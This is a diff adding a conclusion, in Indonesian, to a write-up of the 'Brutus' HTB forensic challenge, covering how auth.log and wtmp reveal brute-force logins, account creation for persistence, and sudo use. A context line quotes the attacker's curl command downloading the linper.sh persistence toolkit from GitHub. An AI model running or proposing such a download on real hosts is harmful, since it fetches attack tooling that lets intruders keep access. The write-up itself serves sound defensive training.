@@ -149,3 +149,16 @@ Di Binaries Local
 
 /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
 
+## Kesimpulan Pembelajaran
+
+Kasus ini mendemonstrasikan bagaimana log sistem yang fundamental, seperti auth.log dan wtmp, dapat menjadi sumber informasi utama dalam investigasi insiden keamanan.
+
+Beberapa pelajaran dari proses investigasi tersebut :
+
+1. auth.log bukan hanya berguna untuk mendeteksi serangan brute-force, tetapi juga sangat kaya informasi untuk melacak aktivitas pasca-eksploitasi seperti pembuatan akun baru (persistence), penggunaan hak istimewa (sudo), dan eksekusi perintah.
+
+2. Memahami Korelasi Data dari Berbagai Sumber.Investigasi ini menggabungkan data dari dua file log berbeda (auth.log dan wtmp) untuk mendapatkan gambaran yang lebih lengkap, mulai dari percobaan autentikasi, sesi yang sukses, hingga durasi sesi tersebut.
+
+3. Pemetaan ke MITRE ATT&CK dengan Mengaitkan taktik attacker (membuat akun lokal) dengan ID teknik yang spesifik (T1136.001) membantu dalam memahami konteks serangan dalam kerangka industri yang diakui.
+
+Secara keseluruhan, "Brutus HTB" memberikan pengalaman langsung yang berharga tentang bagaimana seorang analis keamanan dapat memanfaatkan log sistem untuk menyelidiki insiden, bahkan dari serangan yang relatif sederhana sekalipun.
